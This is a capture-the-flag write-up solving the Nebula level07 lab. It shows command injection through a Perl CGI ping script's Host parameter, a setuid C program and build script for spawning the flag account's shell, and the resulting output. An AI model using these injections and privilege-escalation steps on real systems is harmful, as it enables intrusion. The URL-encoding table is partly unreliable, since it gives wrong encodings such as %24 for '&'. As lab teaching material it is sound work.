Question URL: https://exploit.education/nebula/level-07/

Source Code:(index.cgi)
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc
ping(param("Host"));


Information gathering:
a. httpd is running as flag07
level07@nebula:/home/flag07$ ps -ef | grep http
flag07    1383     1  0 03:34 ?        00:00:00 /usr/sbin/thttpd -C /home/flag07/thttpd.conf

b. Paramter can be passed into CGI program. On the above source code, index.cgi receives Host parameter as URL parameter type
CGI receives parameter through URL with the format of "index.cgi?name=value&name2=value2&..."
e.g.) http://192.168.10.133:7007/index.cgi?Host=www.google.com <= Host will be fed with www.google.com

c. As you can see, we can pass any commands to cgi program as a passing Host value
http://192.168.10.133:7007/index.cgi?Host=;/bin/bash <== This will be replaced like ping -c 3 ;/bin/bash 

d. Test cgi file with parameter through CLI
level07@nebula:/home/flag07$ ./index.cgi Host=localhost
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.016 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.031 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.016/0.027/0.034/0.007 ms
</pre></body></html>


level07@nebula:/home/flag07$ ./index.cgi Host=localhost%3Bls
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_req=1 ttl=64 time=0.018 ms
64 bytes from localhost (127.0.0.1): icmp_req=2 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_req=3 ttl=64 time=0.104 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.018/0.052/0.104/0.037 ms
index.cgi
thttpd.conf
</pre></body></html>level07@nebula:/home/flag07$


Lesson learned:
a. URL encoding needed
- When you send Unix commands as cgi parameter and your unix commands include special characters (special meaning with Internet browsers),
you MUST encode those special characters.
** Note: If the characters in URL is actual HTML codes, it SHOULD NOT be encoded. e.g. &amp <= & shouldn't be encoded as "%24amp" **

Reserved Characters URL Encoding

Character	        Purpose in URL  	                    Encoding
===========   =======================================   ========
  ;(semicolon) Separate protocol (http) from address	    %3B
  /	           Separate domain and directories	          %2F
  #	           Separate anchors	                          %23
  ?	           Separate query string	                    %3F
  &	           Separate query elements	                  %24
  @	           Separate username and password from domain	%40
  %	           Indicates an encoded character	            %25
  +	           Indicates a space	                        %2B
 <space>	     Not recommended in URLs	                  %20 or +
====================================================================
e.g.) 
Commands to send: /bin/bash
http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Fbin%2Fbash 
** Special characters used as its original meaning with Browserd should not be encoded. Above example, ? is used as its original special
meaning which is "separating query string"

b. exploit program created under /tmp won't work as expected. I think this is something relevant to /tmp directory sticky bit property
where only owner or group of a file can delete, rename, and also execute. The fix was to simply place the exploit under /home/flag07
- When I placed exploit program under tmp, it didn't work.
level07@nebula:/tmp$ ls -al
total 24
...
-rwsr-sr-x 1 flag07  flag07  7198 2019-02-10 03:31 exploit
....

level07@nebula:/tmp$ ./exploit
uid=1008(level07) gid=1008(level07) groups=1008(level07)
level07@nebula:/tmp$ id
uid=1008(level07) gid=1008(level07) groups=1008(level07)



Sol. - Plan: As we did in level03, I am going to create a c-code setting setuid and running calling process's(flag07) /bin/bash.
Then create a shell script which compiles the c-code and then places the compiled program under /home/flag07
a. C-code (/tmp/a.c)
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

int main()
{
        setresuid(992, 992, 992);  <== flag07's uid.
        system("id");
        system("/bin/bash");
        return 0;
}

b. shell script (/tmp/a.sh)
#!/bin/bash

gcc /tmp/a.c -o /home/flag07/exploit
chmod +s /home/flag07/exploit

c. From the browser, send a command executing /tmp/a.sh
http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Ftmp%2Fa.sh

d. Go to /home/flag07 and run exploit
level07@nebula:/home/flag07$ ls -al
total 18
drwxr-x--- 1 flag07 level07   60 2019-02-10 04:13 .
drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwsr-sr-x 1 flag07 flag07  7198 2019-02-10 04:13 exploit
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf

level07@nebula:/home/flag07$ ./exploit
uid=992(flag07) gid=1008(level07) egid=992(flag07) groups=992(flag07),1008(level07)
bash-4.2$ id
uid=992(flag07) gid=1008(level07) groups=992(flag07),1008(level07)

bash-4.2$ getflag
You have successfully executed getflag on a target account
bash-4.2$



Reference:
Setuid, setgid, sticky bit - https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
Browser sepcial character encoding - https://www.lifewire.com/encoding-urls-3467463

